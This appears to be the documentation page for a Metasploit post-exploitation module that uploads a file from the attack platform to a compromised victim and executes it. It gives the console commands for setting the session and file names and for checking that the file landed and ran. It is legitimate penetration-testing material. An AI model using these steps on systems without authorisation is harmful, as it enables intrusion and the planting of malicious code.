This module takes a local file from the attack platform, uploads it to
the victim, and executes it.

## Verification

- Get a shell
- `use post/multi/manage/upload_exec`
- `set SESSION -1`
- `set LFILE` to a file you want to push and run on target
- `run`
- **Verify** it made it to disk in the session's current directory, named like the basename of LFILE ran
- `set RFILE foo.exe`
- `run`
- **Verify** it's called foo.exe on target and ran successfully


